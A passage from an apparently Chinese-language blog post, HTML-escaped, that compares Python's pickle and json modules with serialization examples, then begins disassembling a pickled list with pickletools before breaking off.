class=&#34;line&#34;&gt;x = dairy()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pickle.dumps(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# b&amp;#x27;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01.&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;dairy&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.date = &lt;span class=&#34;number&#34;&gt;1111111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.text = &lt;span class=&#34;string&#34;&gt;&amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.todo = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;zz&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x = dairy()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pickle.dumps(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# b&amp;#x27;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&amp;#125;q\x02(X\x04\x00\x00\x00dateq\x03JG\xf4\x10\x00X\x04\x00\x00\x00textq\x04X\x02\x00\x00\x00sbq\x05X\x04\x00\x00\x00todoq\x06]q\x07(X\x02\x00\x00\x00zzq\x08K&amp;#123;eub.&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;json&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#json&#34;&gt;#&lt;/a&gt; json&lt;/h3&gt;
&lt;p&gt;与 pickle 一样，json 模块也提供了 dumps ()、dump ()、loads ()、load () 则是个函数，且其中区别也与 pickle 中是个函数的区别是一样的。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_dict = &amp;#123;&amp;#x27;name&amp;#x27;:&amp;#x27;张三&amp;#x27; , &amp;#x27;age&amp;#x27;:30 , &amp;#x27;isMarried&amp;#x27;:False&amp;#125; # 定义一个字典&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_str = json.dumps(p_dict)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;\u5f20\u4e09&amp;quot;, &amp;quot;age&amp;quot;: 30, &amp;quot;isMarried&amp;quot;: false&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;json的dumps()函数（dump()函数也有）中提供了一个ensure_ascii参数，将该参数的值设置为False，可令序列化后中文依然正常显示。 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str1 = &amp;#x27;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;\u5f20\u4e09&amp;quot;, &amp;quot;age&amp;quot;: 30, &amp;quot;isMarried&amp;quot;: false&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(json.loads(str1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#x27;name&amp;#x27;: &amp;#x27;张三&amp;#x27;, &amp;#x27;age&amp;#x27;: 30, &amp;#x27;isMarried&amp;#x27;: False&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;json.dump 与 json.load 功能和 pickle 中基本一样，序列化到文件中，从文件中反序列化，不在举例&lt;/p&gt;
&lt;p&gt;json 与 pickle 区别&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;pickle 模块用于 Python 语言特有的类型和用户自定义类型与 Python 基本数据类型之间的转换&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;json 模块用于字符串和 python 数据类型间进行转换。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;定义 person 类&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class Person:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self , name , age , isMarried):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    self.name = name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    self.age = age&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    self.isMarried = isMarried&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = Person(&amp;#x27;张三&amp;#x27; , 30 , False)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;p = Person(&amp;#x27;张三&amp;#x27; , 30 , False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pp = pickle.dumps(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type(pp)   #&amp;lt;class &amp;#x27;bytes&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pp)  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#b&amp;#x27;\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&amp;#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89q\x04X\x03\x00\x00\x00ageq\x05K\x1eX\t\x00\x00\x00isMarriedq\x06\x89ub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2 = pickle.loads(pp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type(p2)  #&amp;lt;class &amp;#x27;__main__.Person&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2.name   #&amp;#x27;张三&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;甚至 pickle 模块还能够对 Peron 本身进行序列化：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;per = pickle.dumps(Person)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(per)   #b&amp;#x27;\x80\x03c__main__\nPerson\nq\x00.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;per2 = pickle.loads(per)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(per2)   #&amp;lt;class &amp;#x27;__main__.Person&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果用 json 对 Person 实例对象进行序列化，就会报错：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = Person(&amp;#x27;张三&amp;#x27; , 30 , False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;json.dumps(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;File &amp;quot;&amp;lt;pyshell#49&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;json.dumps(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TypeError: Object of type &amp;#x27;Person&amp;#x27; is not JSON serializable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;如果非要用 json 对 Person 对象进行序列化，必须先定义一个将 Person 对象转化为字典（dict) 的方法&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def person2dict(per):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;name&amp;#x27;:per.name ,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;age&amp;#x27;:per.age ,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;isMarried&amp;#x27;:per.isMarried&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p3 = json.dumps(p , default=person2dict)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type(p3)    #&amp;lt;class &amp;#x27;str&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p3)   # &amp;#x27;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;\\u5f20\\u4e09&amp;quot;, &amp;quot;age&amp;quot;: 30, &amp;quot;isMarried&amp;quot;: false&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p3 = json.dumps(p , default=person2dict , ensure_ascii=False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type(p3)   #&amp;lt;class &amp;#x27;str&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p3)  # &amp;#x27;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;张三&amp;quot;, &amp;quot;age&amp;quot;: 30, &amp;quot;isMarried&amp;quot;: false&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当然，也不能直接进行反序列化，不然也只会得到一个字典：&lt;/p&gt;
&lt;p&gt;此时，也要定义一个将字典转换为 Person 类实例的方法，在进行反序列化：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def dict2person(d):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return Person(d[&amp;#x27;name&amp;#x27;],d[&amp;#x27;age&amp;#x27;],d[&amp;#x27;isMarried&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p5 = json.loads(p3 , object_hook=dict2person)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type(p5)         #&amp;lt;class &amp;#x27;__main__.Person&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p5.name)   #&amp;#x27;张三&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;（2）pickle 序列化结果为 bites 类型，只适合于 Python 机器之间的交互。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;json 序列化结果为 str 类型，能够被多种语言识别，可用于与其他程序设计语言交互。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON 和 Python 内置的数据类型对应如下：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;JSON 类型&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Python 类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;{}&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;dict&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;list&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;“string”&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;‘str’或 u’unicode’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1234.56&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;int 或 float&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;true/false&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;True/False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;null&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;None&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;（1）序列化与反序列化是为了解决内存中对象的持久化与传输问题；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）Python 中提供了 pickle 和 json 两个模块进行序列化与反序列化；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）dumps () 和 dump () 用于序列化，loads () 和 load () 用于反序列化；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）pickle 模块能序列化任何对象，序列化结果为 bites 类型，只适合于 Python 机器之间交互；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;json 模块只能序列化 Python 基本类型，序列化结果为 json 格式字符串，适合不同开发语言之间交互。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTc1Njgx&#34;&gt;https://cloud.tencent.com/developer/article/1575681&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;反序列化流程分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化流程分析&#34;&gt;#&lt;/a&gt; 反序列化流程分析&lt;/h3&gt;
&lt;p&gt;直接分析反序列化出的字符串是比较困难的，我们可以使用 &lt;code&gt;pickletools&lt;/code&gt;  帮助我们进行分析&lt;/p&gt;
&lt;p&gt;pickletools 是 python 自带的 pickle 调试器，有三个功能：&lt;strong&gt;反汇编&lt;/strong&gt;一个已经被打包的字符串、&lt;strong&gt;优化&lt;/strong&gt;一个已经被打包的字符串、返回一个迭代器来供程序使用。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_list = [&amp;#x27;a&amp;#x27;,&amp;#x27;b&amp;#x27;,&amp;#x27;c&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_list_pickle = pickle.dumps(a_list,protocol=0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(a_list_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;------------------&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 优化一个已经被打包的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_list_pickle = pickletools.optimize(a_list_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(a_list_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;------------------&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 反汇编一个已经被打包的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(a_list_pickle)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;(lp0\nVa\np1\naVb\np2\naVc\np3\na.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;(lVa\naVb\naVc\na.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1: l        LIST       (MARK at 0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: V    UNICODE    &amp;#x27;a&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    5: a    APPEND&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    6: V    UNICODE    &amp;#x27;b&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    9: a    APPEND&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   10: V    UNICODE    